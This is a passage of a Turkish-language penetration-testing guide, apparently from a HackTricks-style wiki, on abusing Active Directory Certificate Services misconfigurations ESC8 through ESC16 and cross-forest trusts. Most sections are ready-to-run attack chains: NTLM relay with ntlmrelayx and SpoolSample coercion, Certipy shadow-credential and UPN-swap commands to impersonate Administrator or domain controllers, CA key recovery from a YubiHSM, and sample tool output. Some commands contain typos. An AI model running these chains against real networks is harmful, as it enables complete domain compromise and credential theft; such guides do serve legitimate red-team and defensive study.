`msPKI-Enrollment-Servers` özelliği, kurumsal Sertifika Yetkilileri (CAs) tarafından Sertifika Kayıt Hizmeti (CES) uç noktalarını depolamak için kullanılır. Bu uç noktalar **Certutil.exe** aracı kullanılarak ayrıştırılabilir ve listelenebilir:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify ile kötüye kullanım
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) ile istismar

Bir sertifika isteği, varsayılan olarak Certipy tarafından `Machine` veya `User` şablonuna göre yapılır; bu, relay edilen hesap adının `$` ile bitip bitmediğine göre belirlenir. Alternatif bir şablon belirtimi `-template` parametresi kullanılarak yapılabilir.

[PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik kimlik doğrulamayı zorlamak için kullanılabilir. Etki alanı denetleyicileri ile uğraşıldığında `-template DomainController` belirtilmesi gerekir.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Güvenlik Uzantısı Yok - ESC9 <a href="#id-5485" id="id-5485"></a>

### Açıklama

Yeni değer **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) için **`msPKI-Enrollment-Flag`**, ESC9 olarak adlandırılan, bir sertifikaya **yeni `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısının** gömülmesini engeller. Bu bayrak, `StrongCertificateBindingEnforcement` `1` olarak ayarlandığında (varsayılan ayar) önem kazanır; bu, `2` ile olan duruma karşıtlık oluşturur. Daha zayıf bir sertifika eşlemesinin Kerberos veya Schannel için sömürülebileceği senaryolarda (ESC10 gibi) ESC9'un yokluğunun gereksinimleri değiştirmeyeceği göz önünde bulundurulduğunda önemi artar.

Bu bayrağın ayarının önemli hale geldiği koşullar şunlardır:

- `StrongCertificateBindingEnforcement` `2` olarak ayarlanmamıştır (varsayılan `1`dir) veya `CertificateMappingMethods` içinde `UPN` bayrağı bulunmaktadır.
- Sertifika `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağıyla işaretlenmiştir.
- Sertifika tarafından herhangi bir client authentication EKU belirtilmiştir.
- Başka bir hesabı ele geçirmek için herhangi bir hesap üzerinde `GenericWrite` izinleri mevcuttur.

### Kötüye Kullanım Senaryosu

Varsayalım ki `John@corp.local`, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahiptir ve amacı `Administrator@corp.local`'ı ele geçirmektir. `Jane@corp.local`'ın enroll olmasına izin verilen ESC9 sertifika şablonu, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı ile yapılandırılmıştır.

Başlangıçta, Jane'in hash'i Shadow Credentials kullanılarak elde edilir, John'un `GenericWrite` izni sayesinde:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Ardından, `Jane`'in `userPrincipalName` değeri kasıtlı olarak `Administrator` olarak değiştirilir; `@corp.local` alan adı kısmı bilerek atlanmıştır:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bu değişiklik, `Administrator@corp.local`'un `Administrator`'ın `userPrincipalName` olarak farklı kalması göz önüne alındığında kısıtlamaları ihlal etmez.

Bunun ardından, zafiyetli olarak işaretlenmiş `ESC9` sertifika şablonu, `Jane` olarak istenir:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Sertifikadaki `userPrincipalName`'ın `Administrator` olarak göründüğü ve herhangi bir “object SID” içermediği görülür.

`Jane`'in `userPrincipalName`'ı daha sonra orijinali `Jane@corp.local` olarak geri döndürülür:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Verilen sertifika ile kimlik doğrulamaya çalışmak artık `Administrator@corp.local`'ın NT hash'ini döndürüyor. Sertifikada domain belirtilmemesi nedeniyle komutta `-domain <domain>` bulunmalıdır:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Zayıf Sertifika Eşlemeleri - ESC10

### Açıklama

ESC10, etki alanı denetleyicisi üzerinde iki kayıt defteri değeri ile ilgilidir:

- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
- The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.

**Vaka 1**

When `StrongCertificateBindingEnforcement` is configured as `0`.

**Vaka 2**

If `CertificateMappingMethods` includes the `UPN` bit (`0x4`).

### Kötüye Kullanım Vaka 1

With `StrongCertificateBindingEnforcement` configured as `0`, an account A with `GenericWrite` permissions can be exploited to compromise any account B.

For instance, having `GenericWrite` permissions over `Jane@corp.local`, an attacker aims to compromise `Administrator@corp.local`. The procedure mirrors ESC9, allowing any certificate template to be utilized.

Initially, `Jane`'s hash is retrieved using Shadow Credentials, exploiting the `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Sonrasında, `Jane`'s `userPrincipalName` `Administrator` olarak değiştirilir; kısıtlama ihlalinden kaçınmak için `@corp.local` kısmı kasıtlı olarak atlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bunun ardından, varsayılan `User` şablonu kullanılarak `Jane` adına istemci kimlik doğrulamasını sağlayan bir sertifika talep edilir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` daha sonra orijinal değeri olan `Jane@corp.local` olarak geri döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Elde edilen sertifikayla yapılan kimlik doğrulaması, `Administrator@corp.local`'ın NT hash'ini sağlayacaktır; sertifikada domain bilgisi bulunmadığı için komutta domainin belirtilmesi gerekir.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Suistimal Durumu 2

`CertificateMappingMethods` içinde `UPN` bit bayrağı (`0x4`) bulunduğunda, `GenericWrite` izinlerine sahip bir A hesabı, `userPrincipalName` özelliği olmayan herhangi bir B hesabını ele geçirebilir; buna makine hesapları ve yerleşik domain yöneticisi `Administrator` da dahildir.

Burada amaç, `GenericWrite`'i kullanarak Shadow Credentials ile `Jane`'in hash'ini elde etmekle başlayarak `DC$@corp.local`'ı ele geçirmektir.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'in `userPrincipalName` daha sonra `DC$@corp.local` olarak ayarlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
İstemci kimlik doğrulaması için bir sertifika, varsayılan `User` şablonu kullanılarak `Jane` adına istendi.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` değeri bu işlemden sonra orijinaline geri döner.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel üzerinden kimlik doğrulaması yapmak için Certipy’nin `-ldap-shell` seçeneği kullanılır; bu, kimlik doğrulamanın `u:CORP\DC$` olarak başarılı olduğunu gösterir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell üzerinden, `set_rbcd` gibi komutlar Resource-Based Constrained Delegation (RBCD) saldırılarına olanak sağlar ve potansiyel olarak domain controller'ı ele geçirebilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Bu zafiyet, `userPrincipalName` eksik olan veya `sAMAccountName` ile eşleşmeyen herhangi bir kullanıcı hesabına da yayılır; varsayılan `Administrator@corp.local`, varsayılan olarak `userPrincipalName`'e sahip olmaması ve yükseltilmiş LDAP ayrıcalıkları nedeniyle başlıca hedeftir.

## Relaying NTLM to ICPR - ESC11

### Explanation

CA Server `IF_ENFORCEENCRYPTICERTREQUEST` ile yapılandırılmamışsa, RPC servisi üzerinden imzalama olmadan NTLM relay saldırıları yapılabilir. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

`certipy`'yi, `Enforce Encryption for Requests`'in devre dışı (Disabled) olup olmadığını listelemek için kullanabilirsiniz ve certipy `ESC11` zafiyetlerini gösterecektir.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

Bir relay server kurması gerekiyor:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Not: Etki alanı denetleyicileri için DomainController içinde `-template` belirtmeliyiz.

Veya [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## YubiHSM ile ADCS CA'ya shell erişimi - ESC12

### Açıklama

Yöneticiler Sertifika Yetkilisi'ni (Certificate Authority) "Yubico YubiHSM2" gibi harici bir cihaza depolayacak şekilde yapılandırabilirler.

CA sunucusuna bir USB portu aracılığıyla doğrudan bir USB cihazı bağlanmışsa veya CA sunucusu bir sanal makine ise bir USB device server aracılığıyla bağlıysa, Key Storage Provider'ın YubiHSM içinde anahtar oluşturup kullanabilmesi için bir kimlik doğrulama anahtarı (bazen "password" olarak anılır) gereklidir.

Bu anahtar/parola kayıt defterinde `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` altında düz metin (cleartext) olarak saklanır.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Kötüye Kullanım Senaryosu

Eğer CA'nın özel anahtarı fiziksel bir USB cihazında saklanıyorsa ve siz shell erişimi elde ettiyseniz, anahtarı kurtarmak mümkündür.

İlk olarak CA sertifikasını elde etmeniz gerekir (bu herkese açıktır) ve sonra:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Son olarak, CA sertifikası ve onun özel anahtarı kullanılarak yeni, keyfi bir sertifika oluşturmak için certutil `-sign` komutunu kullanın.

## OID Group Link Abuse - ESC13

### Açıklama

`msPKI-Certificate-Policy` özniteliği, sertifika şablonuna bir verme politikasının eklenmesine izin verir. Verme politikalarından sorumlu `msPKI-Enterprise-Oid` nesneleri, PKI OID kapsayıcısının Configuration Naming Context'inde (CN=OID,CN=Public Key Services,CN=Services) keşfedilebilir. Bir politika, bu nesnenin `msDS-OIDToGroupLink` özniteliği kullanılarak bir AD grubuna bağlanabilir; böylece sertifikayı sunan bir kullanıcı, grubun bir üyesiymiş gibi yetkilendirilebilir. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Diğer bir deyişle, bir kullanıcının sertifika enroll etme izni varsa ve sertifika bir OID grubuna bağlıysa, kullanıcı bu grubun ayrıcalıklarını devralabilir.

OIDToGroupLink'i bulmak için [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kullanın:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Kötüye Kullanım Senaryosu

Bir kullanıcının hangi izne sahip olduğunu bulmak için `certipy find` veya `Certify.exe find /showAllPermissions` kullanılabilir.

Eğer `John`'un `VulnerableTemplate`'a enroll izni varsa, kullanıcı `VulnerableGroup` grubunun ayrıcalıklarını devralabilir.

Yapması gereken tek şey şablonu belirtmektir; böylece OIDToGroupLink haklarına sahip bir sertifika alacaktır.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Zayıf Sertifika Yenileme Yapılandırması - ESC14

### Açıklama

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping adresindeki açıklama olağanüstü ayrıntılıdır. Aşağıda orijinal metinden bir alıntı yer almaktadır.

ESC14, özellikle Active Directory kullanıcı veya bilgisayar hesaplarındaki `altSecurityIdentities` özniteliğinin kötüye kullanımı veya güvensiz yapılandırılması nedeniyle ortaya çıkan "weak explicit certificate mapping" zafiyetlerini ele alır. Bu çok değerli öznitelik, yöneticilere X.509 sertifikalarını kimlik doğrulama amacıyla bir AD hesabına manuel olarak ilişkilendirme imkanı verir. Doldurulduğunda, bu açık eşlemeler genellikle sertifikanın SAN'ındaki UPN'lere veya DNS adlarına ya da `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısında gömülü SID'e dayanan varsayılan sertifika eşleme mantığının önüne geçebilir.

Bir "zayıf" eşleme, `altSecurityIdentities` özniteliği içinde bir sertifikayı tanımlamak için kullanılan dize değeri çok geniş olduğunda, kolayca tahmin edilebilir olduğunda, benzersiz olmayan sertifika alanlarına dayandığında veya kolayca taklit edilebilen sertifika bileşenleri kullandığında ortaya çıkar. Bir saldırgan, ayrıcalıklı bir hesap için böyle zayıf tanımlanmış bir açık eşlemeyle eşleşen bir sertifika elde edebilirse veya oluşturabilirse, o hesabı doğrulamak ve taklit etmek için bu sertifikayı kullanabilir.

Potansiyel olarak zayıf `altSecurityIdentities` eşleme dizelerine örnekler şunlardır:

- Sadece yaygın bir Subject Common Name (CN) ile eşleme: ör. `X509:<S>CN=SomeUser`. Bir saldırgan bu CN'ye sahip bir sertifikayı daha az güvenli bir kaynaktan elde edebilir.
- Belirli bir seri numarası veya subject key identifier gibi ek nitelendirme olmadan aşırı genel Issuer Distinguished Name (DN) veya Subject DN kullanma: ör. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Bir saldırganın meşru olarak elde edebileceği veya (bir CA'yı ele geçirdiyse veya ESC1'de olduğu gibi savunmasız bir şablon bulduysa) sahteleyebileceği sertifikada karşılayabileceği diğer öngörülebilir desenleri veya kriptografik olmayan tanımlayıcıları kullanma.

`altSecurityIdentities` özniteliği şu gibi çeşitli eşleme formatlarını destekler:

- `X509:<I>IssuerDN<S>SubjectDN` (tam Issuer ve Subject DN ile eşler)
- `X509:<SKI>SubjectKeyIdentifier` (sertifikanın Subject Key Identifier uzantı değeri ile eşler)
- `X509:<SR>SerialNumberBackedByIssuerDN` (seri numarasına göre eşler, dolaylı olarak Issuer DN ile nitelendirilir) - bu standart bir format değildir, genellikle `<I>IssuerDN<SR>SerialNumber` şeklindedir.
- `X509:<RFC822>EmailAddress` (SAN'dan genellikle bir e-posta adresi olan bir RFC822 adına göre eşler)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (sertifikanın ham açık anahtarının SHA1 karması ile eşler - genel olarak güçlü)

Bu eşlemelerin güvenliği, eşleme dizesinde seçilen sertifika tanımlayıcılarının özgüllüğüne, benzersizliğine ve kriptografik gücüne büyük ölçüde bağlıdır. Domain Controller'larda güçlü sertifika bağlama modları etkin olsa bile (bunlar öncelikle SAN UPN/DNS ve SID uzantısına dayalı örtük eşlemeleri etkiler), zayıf yapılandırılmış bir `altSecurityIdentities` girdisi, eşleme mantığı kendisi hatalı veya çok izin verici ise yine de taklit için doğrudan bir yol sunabilir.

### Kötüye Kullanım Senaryosu

ESC14, Active Directory (AD) içindeki açık sertifika eşlemelerini, özel olarak `altSecurityIdentities` özniteliğini hedef alır. Bu öznitelik ayarlıysa (tasarım gereği veya yanlış yapılandırma sonucu), saldırganlar eşlemeyle uyuşan sertifikaları sunarak hesapları taklit edebilirler.

#### Senaryo A: Saldırgan `altSecurityIdentities` Üzerine Yazabilir

Önkoşul: Saldırganın hedef hesabın `altSecurityIdentities` özniteliğine yazma izinleri veya hedef AD nesnesi üzerinde aşağıdaki izinlerden birini verme izni bulunmaktadır:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Senaryo B: Hedefin X509RFC822 (E-Posta) Yoluyla Zayıf Eşlemesi Var

- Önkoşul: Hedefin altSecurityIdentities içinde zayıf bir X509RFC822 eşlemesi vardır. Bir saldırgan, kurbanın mail özniteliğini hedefin X509RFC822 adıyla eşleşecek şekilde ayarlayabilir, kurban adına bir sertifika kaydettirebilir ve bu sertifikayı hedef olarak kimlik doğrulaması yapmak için kullanabilir.

#### Senaryo C: Hedefin X509IssuerSubject Eşlemesi Var

- Önkoşul: Hedefin `altSecurityIdentities` içinde zayıf bir X509IssuerSubject açık eşlemesi vardır. Saldırgan, kurban ilkesi üzerindeki `cn` veya `dNSHostName` özniteliğini hedefin X509IssuerSubject eşlemesinin subject'ı ile eşleşecek şekilde ayarlayabilir. Ardından saldırgan, kurban adına bir sertifika kaydettirip bu sertifikayı hedef olarak kimlik doğrulaması yapmak için kullanabilir.

#### Senaryo D: Hedefin X509SubjectOnly Eşlemesi Var

- Önkoşul: Hedefin `altSecurityIdentities` içinde zayıf bir X509SubjectOnly açık eşlemesi vardır. Saldırgan, kurban ilkesi üzerindeki `cn` veya `dNSHostName` özniteliğini hedefin X509SubjectOnly eşlemesinin subject'ı ile eşleşecek şekilde ayarlayabilir. Ardından saldırgan, kurban adına bir sertifika kaydettirip bu sertifikayı hedef olarak kimlik doğrulaması yapmak için kullanabilir.

### somut işlemler

#### Senaryo A

Sertifika şablonu `Machine` için bir sertifika talep edin.
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sertifikayı kaydet ve dönüştür
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Kimlik doğrulama (sertifika kullanarak)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Temizlik (isteğe bağlı)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Daha spesifik saldırı yöntemleri için lütfen şu kaynağa bakın: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Uygulama Politikaları(CVE-2024-49019) - ESC15

### Açıklama

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc adresindeki açıklama bir hayli ayrıntılıdır. Aşağıda orijinal metinden bir alıntı bulunmaktadır.

Yerleşik varsayılan sürüm 1 sertifika şablonlarını kullanarak, bir saldırgan CSR'yi şablonda belirtilen yapılandırılmış Extended Key Usage özniteliklerinden daha tercih edilen uygulama politikalarını içerecek şekilde oluşturabilir. Tek gereksinim enrollment haklarıdır ve bu yöntem **_WebServer_** şablonu kullanılarak client authentication, certificate request agent ve codesigning sertifikaları üretmek için kullanılabilir.

### Kötüye Kullanım

Aşağıdakiler [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.

Certipy'nin `find` komutu, CA yamalanmamışsa ESC15'e potansiyel olarak açık olabilecek V1 şablonlarını belirlemeye yardımcı olabilir.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Senaryo A: Schannel aracılığıyla Doğrudan Taklit

**Adım 1: Bir sertifika isteyin; "Client Authentication" Application Policy'sini ve hedef UPN'i enjekte ederek.** Saldırgan `attacker@corp.local` `administrator@corp.local`'ı, kayıt sahibinin sağladığı subject'e izin veren "WebServer" V1 şablonunu kullanarak hedef alır.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Güvenlik açığı olan V1 şablonu; "Kayıt yapanın subject sağlaması".
- `-application-policies 'Client Authentication'`: CSR'nin Application Policies uzantısına OID `1.3.6.1.5.5.7.3.2`'yi ekler.
- `-upn 'administrator@corp.local'`: Kimlik taklidi için SAN'da UPN'i ayarlar.

**Adım 2: Elde edilen sertifikayı kullanarak Schannel (LDAPS) üzerinden kimlik doğrulaması yapın.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Senaryo B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Adım 1: "Enrollee supplies subject" içeren bir V1 şablonundan sertifika talep edin ve "Certificate Request Agent" Application Policy'sini enjekte edin.** Bu sertifika, saldırganın (`attacker@corp.local`) bir enrollment agent olabilmesi içindir. Burada saldırganın kendi kimliği için herhangi bir UPN belirtilmez; amaç ajan yeteneğidir.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1`'yi enjekte eder.

**Adım 2: Hedef ayrıcalıklı bir kullanıcı adına sertifika talep etmek için "agent" sertifikasını kullanın.** Bu, Adım 1'deki sertifikayı "agent" sertifikası olarak kullanan ESC3-like bir adımdır.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Adım 3: "on-behalf-of" sertifikasını kullanarak ayrıcalıklı kullanıcı olarak kimlik doğrulayın.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA'da Güvenlik Uzantısı Devre Dışı (Genel)-ESC16

### Açıklama

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)**, AD CS konfigürasyonu tüm sertifikalara **szOID_NTDS_CA_SECURITY_EXT** uzantısının eklenmesini zorunlu kılmıyorsa, bir saldırganın bunu şu şekilde kötüye kullanabileceği senaryoya işaret eder:

1. **SID binding olmadan** bir sertifika talep etmek.

2. Bu sertifikayı **herhangi bir hesap olarak kimlik doğrulaması için** kullanmak; örneğin yüksek ayrıcalıklı bir hesabı (ör. Domain Administrator) taklit etmek.

Detaylı prensibi öğrenmek için şu makaleye de bakabilirsiniz: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Kötüye Kullanım

Aşağıdakiler [bu linke](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) referans verilmiştir. Daha ayrıntılı kullanım yöntemleri için tıklayın.

Active Directory Certificate Services (AD CS) ortamının **ESC16**'ya karşı savunmasız olup olmadığını belirlemek için
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Adım 1: Hedef hesabın ilk UPN'sini oku (İsteğe bağlı - geri yükleme için).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Adım 2: Mağdur hesabın UPN'sini hedef yöneticinin `sAMAccountName` değeriyle güncelleyin.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Adım 3: (Gerekirse) "victim" hesabı için kimlik bilgilerini edinin (örn. Shadow Credentials ile).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Adım 4: ESC16-vulnerable CA üzerinde "victim" kullanıcısı olarak _any suitable client authentication template_ (ör. "User") üzerinden bir sertifika talep edin.** CA ESC16'e karşı savunmasız olduğu için, şablonun bu uzantı için belirli ayarlarına bakılmaksızın verilen sertifikadan otomatik olarak SID security extension'ı çıkaracaktır. Kerberos credential cache environment variable'ını ayarlayın (shell komutu):
```bash
export KRB5CCNAME=victim.ccache
```
Sonra sertifikayı isteyin:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Adım 5: "victim" hesabının UPN'sini eski haline döndür.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Adım 6: Hedef yönetici olarak kimlik doğrulaması yapın.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Sertifikalarla Forest'ların Ele Geçirilmesi — Edilgen Anlatımla Açıklama

### Compromised CA'lar Tarafından Forest Trust'larının Bozulması

**cross-forest enrollment** yapılandırması nispeten basit hale getirilmiştir. Kaynak forest'taki **root CA certificate**, yöneticiler tarafından **published to the account forests** yapılır ve kaynak forest'taki **enterprise CA** sertifikaları her bir hesap forest'ına **added to the `NTAuthCertificates` and AIA containers in each account forest**. Açıklamak gerekirse, bu düzenleme yönettiği PKI için diğer tüm forest'lar üzerinde **CA in the resource forest complete control** yetkisini verir. Eğer bu CA **compromised by attackers** olursa, kaynak ve hesap forest'larındaki tüm kullanıcıların sertifikaları saldırganlar tarafından **forged by them** yapılabilir; böylece forest'un güvenlik sınırı ihlal edilmiş olur.

### Yabancı Principal'lara Verilen Enrollment Ayrıcalıkları

Çoklu-forest ortamlarında, Enterprise CAs tarafından **publish certificate templates** yapılan ve **Authenticated Users or foreign principals** (Enterprise CA'nın ait olduğu forest'ın dışındaki kullanıcılar/gruplar) için **enrollment and edit rights** veren şablonlara karşı dikkatli olunmalıdır. Bir trust üzerinden kimlik doğrulaması yapıldığında, AD tarafından kullanıcının token'ına **Authenticated Users SID** eklenir. Bu nedenle, eğer bir domain Enterprise CA'ya sahip ve bir şablon **allows Authenticated Users enrollment rights** ise, farklı bir forest'tan bir kullanıcı bu şablonu **enrolled in by a user from a different forest** yapabilir. Benzer şekilde, eğer bir şablon tarafından bir yabancı principal'a **enrollment rights are explicitly granted to a foreign principal by a template** verilmişse, bu durumda bir **cross-forest access-control relationship is thereby created** oluşturulur ve bir forest'taki principal başka bir forest'taki bir şablona **enroll in a template from another forest** yapabilir.

